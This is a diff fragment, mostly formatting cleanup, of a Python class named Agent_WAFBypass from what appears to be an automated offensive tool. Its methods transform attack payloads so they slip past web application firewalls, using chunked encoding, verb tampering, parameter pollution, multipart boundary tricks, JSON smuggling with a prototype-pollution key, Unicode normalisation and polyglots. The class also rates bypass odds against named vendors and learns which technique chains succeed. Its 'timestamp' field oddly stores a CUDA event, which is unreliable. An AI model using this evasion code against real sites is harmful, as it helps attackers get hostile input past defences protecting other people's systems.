+        chunked = "\r\n".join(f"{len(chunk):x}\r\n{chunk}" for chunk in chunks)
         return f"{chunked}\r\n0\r\n\r\n"
 
     def _http_verb_tamper(self, payload: str) -> str:
         """Tamper HTTP verb to bypass method-based filtering."""
-        verbs = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
+        verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
         import random
+
         return f"{random.choice(verbs)} {payload}"
 
     def _parameter_pollution(self, payload: str) -> str:
         """Use HTTP parameter pollution to confuse WAF."""
-        if '=' in payload:
-            parts = payload.split('=', 1)
+        if "=" in payload:
+            parts = payload.split("=", 1)
             return f"{parts[0]}={parts[1]}&{parts[0]}=benign&{parts[0]}={parts[1]}"
         return payload
 
     def _multipart_boundary_bypass(self, payload: str) -> str:
         """Use multipart/form-data boundary manipulation."""
         import random
-        boundary = "----WebKitFormBoundary" + ''.join(
-            random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
+
+        boundary = "----WebKitFormBoundary" + "".join(
+            random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
             for _ in range(16)
         )
-        return f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\n{payload}\r\n--{boundary}--"
+        return f'--{boundary}\r\nContent-Disposition: form-data; name="data"\r\n\r\n{payload}\r\n--{boundary}--'
 
     def _json_smuggling(self, payload: str) -> str:
         """Smuggle payload in JSON structure."""
         import json
+
         try:
             # Attempt to embed in JSON
             smuggled = {
                 "data": payload,
                 "type": "application/json",
-                "__proto__": {"pollution": payload}
+                "__proto__": {"pollution": payload},
             }
             return json.dumps(smuggled)
-        except:
+        except Exception:
             return f'{{"data":"{payload}"}}'
 
     def _xml_entity_expansion(self, payload: str) -> str:
@@ -1083,17 +1129,18 @@ class Agent_WAFBypass(BaseExpert):
         """Use Unicode normalization forms to bypass filters."""
         try:
             import unicodedata
+
             # Try different normalization forms
-            nfd = unicodedata.normalize('NFD', payload)
-            nfc = unicodedata.normalize('NFC', payload)
-            nfkd = unicodedata.normalize('NFKD', payload)
+            nfd = unicodedata.normalize("NFD", payload)
+            nfc = unicodedata.normalize("NFC", payload)
+            nfkd = unicodedata.normalize("NFKD", payload)
             # Return the one most different from original
             if len(nfd) != len(payload):
                 return nfd
             elif len(nfkd) != len(payload):
                 return nfkd
             return nfc
-        except:
+        except Exception:
             return payload
 
     def _polyglot_construction(self, payload: str) -> str:
@@ -1102,9 +1149,13 @@ class Agent_WAFBypass(BaseExpert):
         polyglot = f"/*{payload}*/-->{payload}<!--/*{payload}*/"
         return polyglot
 
-    def _calculate_evasion_confidence(self, technique_chain: list, waf_type: str,
-                                      recon_confidence: float = 0.5,
-                                      honeypot_confidence: float = 0.5) -> float:
+    def _calculate_evasion_confidence(
+        self,
+        technique_chain: list,
+        waf_type: str,
+        recon_confidence: float = 0.5,
+        honeypot_confidence: float = 0.5,
+    ) -> float:
         """
         Calculate confidence score for an evasion technique chain.
 
@@ -1134,11 +1185,11 @@ class Agent_WAFBypass(BaseExpert):
 
         # WAF-specific adjustments
         waf_factors = {
-            'modsecurity': 0.8,
-            'cloudflare': 0.7,
-            'akamai': 0.6,
-            'aws': 0.75,
-            'generic': 0.9
+            "modsecurity": 0.8,
+            "cloudflare": 0.7,
+            "akamai": 0.6,
+            "aws": 0.75,
+            "generic": 0.9,
         }
         confidence *= waf_factors.get(waf_type, 0.7)
 
@@ -1156,8 +1207,7 @@ class Agent_WAFBypass(BaseExpert):
 
         return min(confidence, 0.95)  # Cap at 95%
 
-    def _update_evasion_memory(self, original: str, variants: list,
-                               feedback: Optional[dict]):
+    def _update_evasion_memory(self, original: str, variants: list, feedback: Optional[dict]):
         """
         Update internal memory with evasion attempt results.
 
@@ -1168,10 +1218,10 @@ class Agent_WAFBypass(BaseExpert):
         """
         # Store in memory
         memory_entry = {
-            'original': original,
-            'variants': variants,
-            'timestamp': torch.cuda.Event() if torch.cuda.is_available() else None,
-            'feedback': feedback
+            "original": original,
+            "variants": variants,
+            "timestamp": torch.cuda.Event() if torch.cuda.is_available() else None,
+            "feedback": feedback,
         }
 
         self.evasion_memory.append(memory_entry)
@@ -1181,10 +1231,10 @@ class Agent_WAFBypass(BaseExpert):
             self.evasion_memory.pop(0)
 
         # Update success patterns if feedback provided
-        if feedback and 'successful_variants' in feedback:
-            for variant_idx in feedback['successful_variants']:
+        if feedback and "successful_variants" in feedback:
+            for variant_idx in feedback["successful_variants"]:
                 if variant_idx < len(variants):
-                    techniques = tuple(variants[variant_idx]['techniques'])
+                    techniques = tuple(variants[variant_idx]["techniques"])
                     if techniques in self.success_patterns:
                         # Update running average
                         old_rate = self.success_patterns[techniques]
@@ -1200,18 +1250,19 @@ class Agent_WAFBypass(BaseExpert):
             Dictionary with evasion stats
         """
         return {
-            'memory_size': len(self.evasion_memory),
-            'learned_patterns': len(self.success_patterns),
-            'top_techniques': sorted(
-                self.success_patterns.items(),
-                key=lambda x: x[1],
-                reverse=True
-            )[:5]
+            "memory_size": len(self.evasion_memory),
+            "learned_patterns": len(self.success_patterns),
+            "top_techniques": sorted(
+                self.success_patterns.items(), key=lambda x: x[1], reverse=True
+            )[:5],
         }
 
-    def _calculate_synergy_level(self, recon_data: Optional[dict],
-                                 honeypot_learnings: Optional[dict],
-                                 intelligence_feedback: dict) -> str:
+    def _calculate_synergy_level(
+        self,
+        recon_data: Optional[dict],
+        honeypot_learnings: Optional[dict],
+        intelligence_feedback: dict,
+    ) -> str:
         """
         Calculate the level of synergy between intelligence sources.
 
@@ -1219,18 +1270,18 @@ class Agent_WAFBypass(BaseExpert):
             Synergy level: 'none', 'low', 'medium', 'high', 'maximum'
         """
         sources = 0
-        if recon_data and 'detected_waf' in recon_data:
+        if recon_data and "detected_waf" in recon_data:
             sources += 1
-        if honeypot_learnings and 'defender_patterns' in honeypot_learnings:
+        if honeypot_learnings and "defender_patterns" in honeypot_learnings:
             sources += 1
         if intelligence_feedback and len(intelligence_feedback) > 0:
             sources += 1
 
         if sources == 0:
-            return 'none'
+            return "none"
         elif sources == 1:
-            return 'low'
+            return "low"
         elif sources == 2:
-            return 'high'
+            return "high"
         else:  # sources == 3
-            return 'maximum'
+            return "maximum"
